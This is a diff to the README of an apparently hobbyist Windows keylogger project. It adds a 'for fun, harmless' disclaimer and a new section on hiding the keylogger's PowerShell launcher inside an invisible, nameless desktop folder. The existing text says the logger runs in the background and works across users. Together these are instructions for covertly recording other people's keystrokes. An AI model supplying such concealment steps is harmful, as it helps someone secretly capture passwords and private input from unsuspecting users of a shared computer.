@@ -1,6 +1,7 @@
 # Keylogger
 
-Keylogger logic using [this keyboard repository](https://github.com/boppreh/keyboard). Currently works as a keylogger for the local computer. 
+FOR FUN - ONLY TO BE USED HARMLESSLY AND LOCALLY <br>
+<br>Keylogger logic using [this keyboard repository](https://github.com/boppreh/keyboard). Currently works as a keylogger for the local computer. 
 Can be used across users on Windows. Meant to be used via the terminal.
 - NOTE: instructions below are targeted for Windows users, other Operating Systems may need to use different commands etc.
 
@@ -24,6 +25,12 @@ Can be used across users on Windows. Meant to be used via the terminal.
 - Save Notepad file as a .ps1 file
 - To run, right click file and select "Run with PowerShell"
 - Now the script should be running in the background :)
+
+## How to make a folder on desktop nameless and invisible
+- Create a new folder on desktop
+- Rename the folder and enter the keys "alt + 255" for an invisible character
+- Choose a blank folder icon
+- Folder should now be invisible to the human eye, now put keylogger .ps1 file into this folder to help hide it
 
 ## Key features
 - Program will keep recording keystrokes and writing them into a text file until you press the "escape" key (subject to change)
